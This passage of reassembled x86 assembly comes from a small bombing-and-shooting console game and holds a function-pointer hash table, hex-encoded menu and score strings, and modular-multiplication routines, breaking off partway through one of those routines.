
/*  --------------------- .rodata1 ----------------------*/

/*  --- Hashing info   --- 
successful       : true
t value          : 128
random           : 0
Number of keys   : 99
Hash table size  : 122
Hash table Max   : 16384
Table utilization: 81.14754098360656
diff             : 13902

 ----------------------- */
HashRowOffsets:
   .long   0x0 # +0
   .long   0x0 # +1
   .long   0xffffffff # +2
   .long   0xffffffff # +3
   .long   0xffffffff # +4
   .long   0xffffffff # +5
   .long   0xffffffff # +6
   .long   0xffffffff # +7
   .long   0xffffffff # +8
   .long   0xffffffff # +9
   .long   0xffffffff # +10
   .long   0xffffffff # +11
   .long   0xffffffff # +12
   .long   0xffffffff # +13
   .long   0xffffffff # +14
   .long   0xffffffff # +15
   .long   0xffffffff # +16
   .long   0xffffffff # +17
   .long   0xffffffff # +18
   .long   0xffffffff # +19
   .long   0x3 # +20
   .long   0xb # +21
   .long   0xffffffff # +22
   .long   0xffffffff # +23
   .long   0x8 # +24
   .long   0x9 # +25
   .long   0xffffffff # +26
   .long   0xc # +27
   .long   0x0 # +28
   .long   0x6 # +29
   .long   0x6 # +30
   .long   0xffffffff # +31
   .long   0xffffffff # +32
   .long   0x7 # +33
   .long   0xa # +34
   .long   0xffffffff # +35
   .long   0xe # +36
   .long   0xffffffff # +37
   .long   0x8 # +38
   .long   0xffffffff # +39
   .long   0xffffffff # +40
   .long   0xffffffff # +41
   .long   0x8 # +42
   .long   0xffffffff # +43
   .long   0xffffffff # +44
   .long   0xffffffff # +45
   .long   0xffffffff # +46
   .long   0xffffffff # +47
   .long   0xffffffff # +48
   .long   0x9 # +49
   .long   0xb # +50
   .long   0xb # +51
   .long   0xffffffff # +52
   .long   0xffffffff # +53
   .long   0xffffffff # +54
   .long   0xffffffff # +55
   .long   0xc # +56
   .long   0x1 # +57
   .long   0xffffffff # +58
   .long   0xc # +59
   .long   0xffffffff # +60
   .long   0xc # +61
   .long   0xffffffff # +62
   .long   0x2 # +63
   .long   0x4 # +64
   .long   0xffffffff # +65
   .long   0x1 # +66
   .long   0x6 # +67
   .long   0x1 # +68
   .long   0x2 # +69
   .long   0x4 # +70
   .long   0xffffffff # +71
   .long   0x0 # +72
   .long   0xffffffff # +73
   .long   0x1 # +74
   .long   0xffffffff # +75
   .long   0x5 # +76
   .long   0xffffffff # +77
   .long   0xffffffff # +78
   .long   0xffffffff # +79
   .long   0x5 # +80
   .long   0x6 # +81
   .long   0xffffffff # +82
   .long   0xffffffff # +83
   .long   0xffffffff # +84
   .long   0xffffffff # +85
   .long   0xffffffff # +86
   .long   0x7 # +87
   .long   0xffffffff # +88
   .long   0xa # +89
   .long   0x0 # +90
   .long   0x3 # +91
   .long   0x2 # +92
   .long   0x6 # +93
   .long   0x8 # +94
   .long   0xffffffff # +95
   .long   0x7 # +96
   .long   0xd # +97
   .long   0x3 # +98
   .long   0x5 # +99
   .long   0xffffffff # +100
   .long   0x8 # +101
   .long   0x7 # +102
   .long   0x8 # +103
   .long   0x9 # +104
   .long   0xffffffff # +105
   .long   0x9 # +106
   .long   0xffffffff # +107
   .long   0xffffffff # +108
   .long   0xffffffff # +109
   .long   0xffffffff # +110
   .long   0x9 # +111
   .long   0xffffffff # +112
   .long   0xa # +113
   .long   0xffffffff # +114
   .long   0xffffffff # +115
   .long   0xffffffff # +116
   .long   0x9 # +117
   .long   0xb # +118
   .long   0x5 # +119
   .long   0x4 # +120
   .long   0xa # +121
   .long   0x7 # +122
   .long   0xb # +123
   .long   0xd # +124
   .long   0xffffffff # +125
   .long   0x1 # +126
   .long   0x1 # +127

HashArray:
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a350 # 2 key=11522 x=90 y=2 index= 2
   .long   FuncPtr_0x8049750 # 3 key=8450 x=66 y=2 index= 3
   .long   FuncPtr_0x804a450 # 4 key=11778 x=92 y=2 index= 4
   .long   FuncPtr_0x804b653 # 5 key=5 x=0 y=5 index= 5
   .long   FuncPtr_0x804b5d3 # 6 key=16261 x=127 y=5 index= 6
   .long   FuncPtr_0x804b1d0 # 7 key=15234 x=119 y=2 index= 7
   .long   FuncPtr_0x804a4d0 # 8 key=11906 x=93 y=2 index= 8
   .long   FuncPtr_0x804a950 # 9 key=13058 x=102 y=2 index= 9
   .long   FuncPtr_0x804a9d0 # 10 key=13186 x=103 y=2 index= 10
   .long   FuncPtr_0x804aa50 # 11 key=13314 x=104 y=2 index= 11
   .long   FuncPtr_0x804a2d0 # 12 key=11394 x=89 y=2 index= 12
   .long   FuncPtr_0x804b150 # 13 key=15106 x=118 y=2 index= 13
   .long   FuncPtr_0x80493d0 # 14 key=7554 x=59 y=2 index= 14
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x8048460 # 18 key=3602 x=28 y=18 index= 18
   .long   FuncPtr_0x80492e0 # 19 key=7314 x=57 y=18 index= 19
   .long   FuncPtr_0x804a460 # 20 key=11794 x=92 y=18 index= 20
   .long   FuncPtr_0x804a3e0 # 21 key=11666 x=91 y=18 index= 21
   .long   FuncPtr_0x804b260 # 22 key=15378 x=120 y=18 index= 22
   .long   FuncPtr_0x804a7e0 # 23 key=12690 x=99 y=18 index= 23
   .long   FuncPtr_0x8048560 # 24 key=3858 x=30 y=18 index= 24
   .long   FuncPtr_0x804b667 # 25 key=25 x=0 y=25 index= 25
   .long   FuncPtr_0x804a560 # 26 key=12050 x=94 y=18 index= 26
   .long   FuncPtr_0x804b0e0 # 27 key=14994 x=117 y=18 index= 27
   .long   FuncPtr_0x804b2e0 # 28 key=15506 x=121 y=18 index= 28
   .long   FuncPtr_0x8048f60 # 29 key=6418 x=50 y=18 index= 29
   .long   FuncPtr_0x80494e0 # 30 key=7826 x=61 y=18 index= 30
   .long   0x0
   .long   FuncPtr_0x804b6ee # 32 key=160 x=1 y=32 index= 32
   .long   0x0
   .long   FuncPtr_0x8049a70 # 34 key=9250 x=72 y=34 index= 34
   .long   FuncPtr_0x8049b70 # 35 key=9506 x=74 y=34 index= 35
   .long   FuncPtr_0x80495f0 # 36 key=8098 x=63 y=34 index= 36
   .long   FuncPtr_0x804a770 # 37 key=12578 x=98 y=34 index= 37
   .long   FuncPtr_0x804b5f3 # 38 key=16293 x=127 y=37 index= 38
   .long   FuncPtr_0x8049c70 # 39 key=9762 x=76 y=34 index= 39
   .long   FuncPtr_0x80484f0 # 40 key=3746 x=29 y=34 index= 40
   .long   FuncPtr_0x80486f0 # 41 key=4258 x=33 y=34 index= 41
   .long   FuncPtr_0x8048b70 # 42 key=5410 x=42 y=34 index= 42
   .long   FuncPtr_0x8048ef0 # 43 key=6306 x=49 y=34 index= 43
   .long   FuncPtr_0x804aef0 # 44 key=14498 x=113 y=34 index= 44
   .long   FuncPtr_0x8048ff0 # 45 key=6562 x=51 y=34 index= 45
   .long   FuncPtr_0x8049270 # 46 key=7202 x=56 y=34 index= 46
   .long   FuncPtr_0x804b470 # 47 key=15906 x=124 y=34 index= 47
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a380 # 50 key=11570 x=90 y=50 index= 50
   .long   FuncPtr_0x804b681 # 51 key=51 x=0 y=51 index= 51
   .long   FuncPtr_0x804a480 # 52 key=11826 x=92 y=50 index= 52
   .long   FuncPtr_0x804a400 # 53 key=11698 x=91 y=50 index= 53
   .long   FuncPtr_0x8049680 # 54 key=8242 x=64 y=50 index= 54
   .long   FuncPtr_0x804b200 # 55 key=15282 x=119 y=50 index= 55
   .long   FuncPtr_0x804a500 # 56 key=11954 x=93 y=50 index= 56
   .long   FuncPtr_0x804b380 # 57 key=15666 x=122 y=50 index= 57
   .long   FuncPtr_0x804aa00 # 58 key=13234 x=103 y=50 index= 58
   .long   FuncPtr_0x804aa80 # 59 key=13362 x=104 y=50 index= 59
   .long   FuncPtr_0x804b300 # 60 key=15538 x=121 y=50 index= 60
   .long   FuncPtr_0x8048100 # 61 key=2738 x=21 y=50 index= 61
   .long   FuncPtr_0x8048400 # 62 key=3506 x=27 y=50 index= 62
   .long   FuncPtr_0x804a700 # 63 key=12466 x=97 y=50 index= 63
   .long   FuncPtr_0x8048880 # 64 key=4658 x=36 y=50 index= 64
   .long   0x0
   .long   FuncPtr_0x804a390 # 66 key=11586 x=90 y=66 index= 66
   .long   FuncPtr_0x8049310 # 67 key=7362 x=57 y=66 index= 67
   .long   FuncPtr_0x804a490 # 68 key=11842 x=92 y=66 index= 68
   .long   FuncPtr_0x804a790 # 69 key=12610 x=98 y=66 index= 69
   .long   FuncPtr_0x804b613 # 70 key=16325 x=127 y=69 index= 70
   .long   FuncPtr_0x8049c90 # 71 key=9794 x=76 y=66 index= 71
   .long   FuncPtr_0x8049810 # 72 key=8642 x=67 y=66 index= 72
   .long   FuncPtr_0x804a990 # 73 key=13122 x=102 y=66 index= 73
   .long   FuncPtr_0x8048290 # 74 key=3138 x=24 y=66 index= 74
   .long   FuncPtr_0x8048310 # 75 key=3266 x=25 y=66 index= 75
   .long   FuncPtr_0x8048790 # 76 key=4418 x=34 y=66 index= 76
   .long   FuncPtr_0x804b410 # 77 key=15810 x=123 y=66 index= 77
   .long   FuncPtr_0x804b69c # 78 key=78 x=0 y=78 index= 78
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a3a0 # 82 key=11602 x=90 y=82 index= 82
   .long   FuncPtr_0x8049ba0 # 83 key=9554 x=74 y=82 index= 83
   .long   FuncPtr_0x804a4a0 # 84 key=11858 x=92 y=82 index= 84
   .long   FuncPtr_0x80480a0 # 85 key=2642 x=20 y=82 index= 85
   .long   FuncPtr_0x804b2a0 # 86 key=15442 x=120 y=82 index= 86
   .long   FuncPtr_0x8049ea0 # 87 key=10322 x=80 y=82 index= 87
   .long   FuncPtr_0x8049f20 # 88 key=10450 x=81 y=82 index= 88
   .long   FuncPtr_0x804a220 # 89 key=11218 x=87 y=82 index= 89
   .long   FuncPtr_0x80489a0 # 90 key=4946 x=38 y=82 index= 90
   .long   FuncPtr_0x804ae20 # 91 key=14290 x=111 y=82 index= 91
   .long   FuncPtr_0x804a320 # 92 key=11474 x=89 y=82 index= 92
   .long   0x0
   .long   0x0
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a3b0 # 98 key=11618 x=90 y=98 index= 98
   .long   FuncPtr_0x804b5b0 # 99 key=16226 x=126 y=98 index= 99
   .long   FuncPtr_0x8049630 # 100 key=8162 x=63 y=98 index= 100
   .long   FuncPtr_0x804a430 # 101 key=11746 x=91 y=98 index= 101
   .long   FuncPtr_0x80499b0 # 102 key=9058 x=70 y=98 index= 102
   .long   FuncPtr_0x804b230 # 103 key=15330 x=119 y=98 index= 103
   .long   FuncPtr_0x804b5b5 # 104 key=16231 x=126 y=103 index= 104
   .long   FuncPtr_0x804a6b0 # 105 key=12386 x=96 y=98 index= 105
   .long   FuncPtr_0x804a930 # 106 key=13026 x=101 y=98 index= 106
   .long   FuncPtr_0x804abb0 # 107 key=13666 x=106 y=98 index= 107
   .long   FuncPtr_0x804b639 # 108 key=16363 x=127 y=107 index= 108
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804b6be # 112 key=112 x=0 y=112 index= 112
   .long   0x0
   .long   FuncPtr_0x804a3c0 # 114 key=11634 x=90 y=114 index= 114
   .long   FuncPtr_0x80498c0 # 115 key=8818 x=68 y=114 index= 115
   .long   FuncPtr_0x8049940 # 116 key=8946 x=69 y=114 index= 116
   .long   0x0
   .long   FuncPtr_0x80499c0 # 118 key=9074 x=70 y=114 index= 118
   .long   FuncPtr_0x804a840 # 119 key=12786 x=99 y=114 index= 119
   .long   FuncPtr_0x804b5c5 # 120 key=16247 x=126 y=119 index= 120
   .long   FuncPtr_0x804b3c0 # 121 key=15730 x=122 y=114 index= 121

/*  --------------------- .rodata ----------------------*/
.p2align 2
#.section .rodata # Addresses: 0x804b708 - 0x804bca9 (0x5a2 bytes)
Var_0x804b708:
   .byte 0x25
   .byte 0x73
   .byte 0x00
Var_0x804b70b:
   .long 0x207c2d2d ##d4
   .long 0x792c7828 ##d4
   .long 0x203d2029 ##d4
   .long 0x2c642528 ##d4
   .long 0x20296425 ##d4
   .long 0x6c41207c ##d4
   .long 0x3d657669 ##d4
   .long 0x7c206425 ##d4
   .long 0x6d6f4220 ##d4
   .long 0x64253d62 ##d4
   .long 0xa7c20 ##d4
Var_0x804b737:
   .long 0x6576654c ##d4
   .long 0x25203a6c ##d4
   .long 0x49202c64 ##d4
   .long 0x25203a44 ##d4
   .byte 0x73
   .byte 0x0a
   .byte 0x00
Var_0x804b74a:
   .long 0x20202020 ##d4
   .byte 0x3e
   .byte 0x00
Var_0x804b750:
   .byte 0x4e
   .byte 0x57
   .byte 0x00
Var_0x804b753:
   .byte 0x4e
   .byte 0x45
   .byte 0x00
Var_0x804b756:
   .byte 0x53
   .byte 0x57
   .byte 0x00
Var_0x804b759:
   .byte 0x53
   .byte 0x45
   .byte 0x00
Var_0x804b75c:
   .long Label_0x8049701
Var_0x804b760:
   .long Label_0x8049728
Var_0x804b764:
   .long Label_0x804971a
Var_0x804b768:
   .long Label_0x804970f
Var_0x804b76c:
   .long Label_0x80496b4
Var_0x804b770:
   .long Label_0x8049728
Var_0x804b774:
   .long Label_0x8049736
Var_0x804b778:
   .long Label_0x804971a
Var_0x804b77c:
   .long Label_0x804970f
Var_0x804b780:
   .long 0x54495845 ##d4
   .long 0x2e474e49 ##d4
   .long 0xa2e2e ##d4
Var_0x804b78c:
   .long 0x20646142 ##d4
   .long 0x75706e49 ##d4
   .byte 0x74
   .byte 0x0a
   .byte 0x00
Var_0x804b797:
   .long 0x20646142 ##d4
   .long 0x696f6843 ##d4
   .long 0xa6563 ##d4
Var_0x804b7a3:
   .long 0x65746e45 ##d4
   .long 0x6d612072 ##d4
   .long 0x746e756f ##d4
   .long 0x20666f20 ##d4
   .long 0x656d6974 ##d4
   .long 0x206f7420 ##d4
   .long 0x3a6e7572 ##d4
   .long 0x64255b20 ##d4
   .long 0x5d64252d ##d4
   .long 0x203a3a ##d4
Var_0x804b7cb:
   .long 0x61766e49 ##d4
   .long 0x2064696c ##d4
   .long 0x756f6d61 ##d4
   .long 0x6f20746e ##d4
   .long 0x69742066 ##d4
   .long 0xa656d ##d4
Var_0x804b7e3:
   .long 0x6563694e ##d4
   .long 0x6d6f6220 ##d4
   .long 0x676e6962 ##d4
   .long 0x6f592021 ##d4
   .long 0x61722075 ##d4
   .long 0x64656b63 ##d4
   .long 0x20707520 ##d4
   .long 0x70206425 ##d4
   .long 0x746e696f ##d4
   .long 0xa2e73 ##d4
Var_0x804b80b:
   .long 0x65746e45 ##d4
   .long 0x6f422072 ##d4
   .long 0x4320626d ##d4
   .long 0x64726f6f ##d4
   .long 0x74616e69 ##d4
   .long 0x45207365 ##d4
   .long 0x31203a78 ##d4
   .long 0x202c3030 ##d4
   .long 0x3a303031 ##d4
   .byte 0x3a
   .byte 0x20
   .byte 0x00
Var_0x804b832:
   .long 0x61766e49 ##d4
   .long 0x2064696c ##d4
   .long 0x726f6f63 ##d4
   .long 0x616e6964 ##d4
   .long 0xa736574 ##d4
   .byte 0x00
Var_0x804b847:
   .long 0x27756f59 ##d4
   .long 0x6f206572 ##d4
   .long 0x6f207475 ##d4
   .long 0x6f622066 ##d4
   .long 0x2e73626d ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804b85d:
   .long 0x63637553 ##d4
   .long 0x66737365 ##d4
   .long 0x796c6c75 ##d4
   .long 0x616c7020 ##d4
   .long 0x6465746e ##d4
   .long 0x6d6f6220 ##d4
   .long 0xa2e62 ##d4
Var_0x804b879:
   .long 0x72656854 ##d4
   .long 0x73692065 ##d4
   .long 0x726c6120 ##d4
   .long 0x79646165 ##d4
   .long 0x62206120 ##d4
   .long 0x20626d6f ##d4
   .long 0x65726568 ##d4
   .long 0x7254202e ##d4
   .long 0x6f732079 ##d4
   .long 0x6877656d ##d4
   .long 0x20657265 ##d4
   .long 0x65736c65 ##d4
   .byte 0x2e
   .byte 0x0a
   .byte 0x00
Var_0x804b8ac:
   .byte 0x2c
   .byte 0x00
Var_0x804b8ae:
   .long 0x454d4147 ##d4
   .long 0x414f4220 ##d4
   .long 0xa4452 ##d4
Var_0x804b8ba:
   .long 0x65746e45 ##d4
   .long 0x68532072 ##d4
   .long 0x4320746f ##d4
   .long 0x64726f6f ##d4
   .long 0x74616e69 ##d4
   .long 0x45207365 ##d4
   .long 0x31203a78 ##d4
   .long 0x202c3030 ##d4
   .long 0x3a303031 ##d4
   .byte 0x3a
   .byte 0x20
   .byte 0x00
Var_0x804b8e1:
   .long 0x27756f59 ##d4
   .long 0x6f206572 ##d4
   .long 0x6f207475 ##d4
   .long 0x75622066 ##d4
   .long 0x74656c6c ##d4
   .long 0xa2e73 ##d4
Var_0x804b8f9:
   .long 0x61657247 ##d4
   .long 0x68732074 ##d4
   .long 0x2021746f ##d4
   .long 0x20756f59 ##d4
   .long 0x20746f67 ##d4
   .long 0xa656e6f ##d4
   .byte 0x00
Var_0x804b912:
   .long 0x726f6353 ##d4
   .long 0x203a6465 ##d4
   .long 0x70206425 ##d4
   .long 0x746e696f ##d4
   .byte 0x73
   .byte 0x0a
   .byte 0x00
Var_0x804b925:
   .long 0x20756f59 ##d4
   .long 0x7373696d ##d4
   .long 0x202e6465 ##d4
   .long 0x74746542 ##d4
   .long 0x6c207265 ##d4
   .long 0x206b6375 ##d4
   .long 0x7478656e ##d4
   .long 0x6d697420 ##d4
   .long 0xa2e65 ##d4
Var_0x804b949:
   .long 0x6e616854 ##d4
   .long 0x6620736b ##d4
   .long 0x5020726f ##d4
   .long 0x6979616c ##d4
   .long 0xa676e ##d4
Var_0x804b95d:
   .long 0x454d4147 ##d4
   .long 0x45564f20 ##d4
   .long 0xa2152 ##d4
Var_0x804b969:
   .long 0x656e2041 ##d4
   .long 0x69682077 ##d4
   .long 0x73206867 ##d4
   .long 0x65726f63 ##d4
   .byte 0x21
   .byte 0x21
   .byte 0x0a
Var_0x804b97c:
   .byte 0x0a
   .byte 0x00
Var_0x804b97e:
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x2d2d2020 ##d4
   .long 0x454d4147 ##d4
   .long 0x45564f20 ##d4
   .long 0xa2d2d52 ##d4
   .byte 0x00
Var_0x804b9ab:
   .long 0x4e202e31 ##d4
   .long 0x47207765 ##d4
   .long 0xa656d61 ##d4
   .byte 0x00
Var_0x804b9b8:
   .long 0x51202e32 ##d4
   .long 0xa746975 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804b9c2:
   .long 0x68676948 ##d4
   .long 0x6f635320 ##d4
   .long 0x3d206572 ##d4
   .long 0xa642520 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804b9d4:
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x2d2d2020 ##d4
   .long 0x72616f42 ##d4
   .long 0x48203a64 ##d4
   .long 0x45444449 ##d4
   .long 0xa2d2d4e ##d4
   .byte 0x00
Var_0x804ba05:
   .long 0x53202e31 ##d4
   .long 0x746f6f68 ##d4
   .byte 0x21
   .byte 0x0a
   .byte 0x00
Var_0x804ba10:
   .long 0x52202e32 ##d4
   .long 0x61657665 ##d4
   .long 0x6f42206c ##d4
   .long 0xa647261 ##d4
   .byte 0x00
Var_0x804ba21:
   .long 0x4e202e33 ##d4
   .long 0x47207765 ##d4
   .long 0xa656d61 ##d4
   .byte 0x00
Var_0x804ba2e:
   .long 0x51202e34 ##d4
   .long 0xa746975 ##d4
   .byte 0x00
Var_0x804ba37:
   .long 0x72727543 ##d4
   .long 0x20746e65 ##d4
   .long 0x726f6353 ##d4
   .long 0x203d2065 ##d4
   .long 0x7c206425 ##d4
   .long 0x746f5420 ##d4
   .long 0x54206c61 ##d4
   .long 0x20656d69 ##d4
   .long 0x616d6552 ##d4
   .long 0x6e696e69 ##d4
   .long 0x25203a67 ##d4
   .long 0x207c2064 ##d4
   .long 0x68676948 ##d4
   .long 0x6f635320 ##d4
   .long 0x3d206572 ##d4
   .long 0x20642520 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804ba79:
   .long 0x746f6853 ##d4
   .long 0x65522073 ##d4
   .long 0x6e69616d ##d4
   .long 0x3a676e69 ##d4
   .long 0x20642520 ##d4
   .long 0x6f42207c ##d4
   .long 0x2073626d ##d4
   .long 0x616d6552 ##d4
   .long 0x6e696e69 ##d4
   .long 0x25203a67 ##d4
   .long 0xa0a64 ##d4
Var_0x804baa5:
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x20202020 ##d4
   .long 0x2d2d2020 ##d4
   .long 0x72616f42 ##d4
   .long 0x52203a64 ##d4
   .long 0x41455645 ##d4
   .long 0x2d44454c ##d4
   .byte 0x2d
   .byte 0x0a
   .byte 0x00
Var_0x804bad8:
   .long 0x50202e31 ##d4
   .long 0x6563616c ##d4
   .long 0x6d6f4220 ##d4
   .byte 0x62
   .byte 0x0a
   .byte 0x00
Var_0x804bae7:
   .long 0x4c202e33 ##d4
   .long 0x74207465 ##d4
   .long 0x206d6568 ##d4
   .long 0x216e7552 ##d4
   .byte 0x0a
   .byte 0x00
Var_0x804baf9:
   .long 0x4e202e34 ##d4
   .long 0x47207765 ##d4
   .long 0xa656d61 ##d4
   .byte 0x00
Var_0x804bb06:
   .long 0x51202e35 ##d4
   .long 0xa746975 ##d4
   .byte 0x00
Var_0x804bb0f:
   .long 0x656c6553 ##d4
   .long 0x6f697463 ##d4
   .byte 0x6e
   .byte 0x2d
   .byte 0x3a
Var_0x804bb1a:
   .byte 0x20
   .byte 0x00
Var_0x804bb1c:
   .long 0x2077654e ##d4
   .long 0x656d6147 ##d4
   .long 0x202d2d20 ##d4
   .long 0x64616552 ##d4
   .long 0x73202c79 ##d4
   .long 0x202c7465 ##d4
   .long 0xa216f67 ##d4
   .byte 0x00
Var_0x804bb39:
   .long 0x6f666542 ##d4
   .long 0x77206572 ##d4
   .long 0x65622065 ##d4
   .long 0x2e6e6967 ##d4
   .long 0x746e4520 ##d4
   .long 0x61207265 ##d4
   .long 0x6d756e20 ##d4
   .long 0x20726562 ##d4
   .long 0x2d20315b ##d4
   .long 0x39323420 ##d4
   .long 0x37363934 ##d4
   .long 0x5d353932 ##d4
   .long 0x20724f0a ##d4
   .long 0x20796e61 ##d4
   .long 0x626d756e ##d4
   .long 0x202e7265 ##d4
   .long 0x6c276557 ##d4
   .long 0x6966206c ##d4
   .long 0x65727567 ##d4
   .long 0x20746920 ##d4
   .long 0x3a74756f ##d4
   .byte 0x20
   .byte 0x00
Var_0x804bb8f:
   .long 0x20646142 ##d4
   .long 0x75706e69 ##d4
   .byte 0x74
   .byte 0x0a
   .byte 0x00
Var_0x804bb9a:
   .long 0x61766e49 ##d4
   .long 0x2064696c ##d4
   .long 0x626d756e ##d4
   .long 0xa7265 ##d4
Var_0x804bbaa:
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010100 ##d4
   .long 0x1010101 ##d4
   .long 0x1010101 ##d4
   .long 0x1010101 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010000 ##d4
   .long 0x1010101 ##d4
   .long 0x1 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1000000 ##d4
   .long 0x1010101 ##d4
   .long 0x1 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1000000 ##d4
   .long 0x10101 ##d4
Var_0x804bc2a:
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010101 ##d4
   .long 0x1010101 ##d4
   .long 0x101 ##d4
   .long 0x0 ##d4
   .long 0x1010100 ##d4
   .long 0x10101 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x1010100 ##d4
   .long 0x10101 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
   .long 0x0 ##d4
isqrMod:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$44, %esp
	movl	68(%esp), %ecx
	movl	76(%esp), %ebx
	movl	64(%esp), %ebp
	movl	%ecx, 24(%esp)
	movl	24(%esp), %eax
	movl	72(%esp), %ecx
	movl	%ebx, 12(%esp)
	movl	%ebx, 20(%esp)
	movl	$64, %ebx
	mull	%eax
	movl	%ecx, 8(%esp)
	movl	%ecx, 16(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L2:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L2
	movl	%eax, %esi
	movl	24(%esp), %eax
	movl	%edx, %edi
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	mull	%ebp
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%esi, 24(%esp)
	movl	16(%esp), %esi
	movl	%edi, 28(%esp)
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L3:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L3
	movl	24(%esp), %esi
	movl	28(%esp), %edi
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	addl	%eax, %esi
	adcl	%edx, %edi
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%esi, (%esp)
	movl	%edi, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, %esi
	movl	%ebp, %eax
	movl	%edx, %edi
	mull	%ebp
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	addl	$44, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
imulMod:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	movl	$64, %ebx
	subl	$60, %esp
	movl	80(%esp), %eax
	movl	84(%esp), %edx
	movl	92(%esp), %ebp
	movl	96(%esp), %esi
	movl	%eax, 40(%esp)
	movl	88(%esp), %eax
	movl	%edx, 24(%esp)
	movl	100(%esp), %edi
	movl	%esi, 8(%esp)
	movl	%eax, 44(%esp)
	movl	%edx, %eax
	mull	%ebp
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%eax, 32(%esp)
	movl	%edx, 36(%esp)
	.p2align 4,,7
	.p2align 3
.L9:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L9
	movl	%eax, 32(%esp)
	movl	44(%esp), %eax
	movl	$32, %ebx
	movl	%edx, 36(%esp)
	mull	24(%esp)
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	%eax, 24(%esp)
	movl	%edx, 28(%esp)
	.p2align 4,,7
	.p2align 3
.L10:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L10
	movl	%eax, 24(%esp)
	movl	40(%esp), %eax
	movl	%edx, 28(%esp)
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	mull	%ebp
	movl	$32, %ebp
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	.p2align 4,,7
	.p2align 3
.L11:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebp
	jne	.L11
